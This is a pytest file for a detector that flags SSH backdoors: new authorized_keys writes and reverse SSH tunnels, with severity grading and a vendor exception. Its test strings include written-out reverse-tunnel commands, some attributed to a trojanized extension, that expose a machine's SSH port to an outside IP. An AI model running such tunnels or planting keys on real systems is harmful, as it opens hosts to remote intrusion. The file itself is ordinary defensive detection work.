"""ssh_backdoor: authorized_keys writes and reverse SSH tunnels, new per device.

Run: .venv/bin/python -m pytest shadow_hunter/ssh_backdoor_test.py -q
"""
from __future__ import annotations

import re

from shadow_hunter.detectors import DETECTORS
from shadow_hunter.detectors.ssh_backdoor import REVERSE_RE, SshBackdoorDetector, build_kql

TUNNEL = re.compile(REVERSE_RE)


def test_reverse_forward_syntax_matches_the_real_cases():
    # the trojanized Cursor Claude Code extension (2026-10-29)
    assert TUNNEL.search("ssh -N -R '*:0:localhost:22' -o StrictHostKeyChecking=no tunnel@198.51.100.88")
    assert TUNNEL.search("autossh -M 0 -NR 2222:localhost:22 tunnel@1.2.3.4")
    # a laptop exposing a dev server (u1048gchatecmac2, Oct 2026)
    assert TUNNEL.search('ssh "-o ServerAliveInterval=30" -p 443 -R0:localhost:8765 a.pinggy.io')
    assert TUNNEL.search("ssh -R 0.0.0.0:9000:127.0.0.1:9000 box.example.com")


def test_lookalikes_do_not_match():
    # -R inside the remote command (Jenkins deploy, 74 runs in 30 days)
    assert not TUNNEL.search('ssh -o StrictHostKeyChecking=no ec2-user@10.202.20.47 "sudo chown -R ec2-user:ec2-user /var/x"')
    # scp's own ssh: -oRemoteCommand=none, -oClearAllForwardings
    assert not TUNNEL.search("/usr/bin/ssh -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -l admin -- 10.21.4.5")
    # lima/colima socket forwards
    assert not TUNNEL.search("ssh -R /run/user/501/docker.sock:/Users/x/.colima/docker.sock lima")


def test_query_judges_each_device_against_its_own_history():
    kql = build_kql()
    assert "join kind=leftanti prior on PairKey" in kql
    assert "authorized_keys" in kql and "administrators_authorized_keys" in kql
    assert '"autossh"' in kql and '"plink.exe"' in kql


def test_registered():
    assert any(d.name == "ssh_backdoor" for d in DETECTORS)


def _row(**kw):
    r = {"DeviceId": "d1", "DeviceName": "host1", "Kind": "authorized_keys", "Dest": "", "Writers": ["node"],
         "Samples": ["/home/u/.ssh/authorized_keys"], "Accounts": ["u"]}
    r.update(kw)
    return r


def test_key_written_by_hand_on_a_server_is_medium_anything_else_high():
    det = SshBackdoorDetector()
    assert det.to_findings([_row(Writers=["vim.basic"])])[0]["severity"] == "medium"
    assert det.to_findings([_row(Writers=["node"])])[0]["severity"] == "high"
    # no key write on a Mac in 30 days: even by hand it is high
    assert det.to_findings([_row(Writers=["vim"], Samples=["/Users/a/.ssh/authorized_keys"])])[0]["severity"] == "high"


def test_tunnel_to_a_public_ip_is_critical_known_tunnel_services_are_left_to_exfil():
    det = SshBackdoorDetector()
    t = dict(Kind="reverse_tunnel", Writers=["sh"], Samples=["ssh -N -R *:0:localhost:22 tunnel@198.51.100.88"])
    assert det.to_findings([_row(Dest="198.51.100.88", **t)])[0]["severity"] == "critical"
    assert det.to_findings([_row(Dest="10.2.3.4", **t)])[0]["severity"] == "high"
    assert det.to_findings([_row(Dest="jump.example.com", **t)])[0]["severity"] == "high"
    assert det.to_findings([_row(Dest="serveo.net", **t)]) == []


def test_kambala_vendor_key_rotation_is_skipped_only_on_its_own_account():
    kql = build_kql()
    assert 'FolderPath == "/home/netra/.ssh/authorized_keys"' in kql and 'contains_cs "/ NUH/d"' in kql
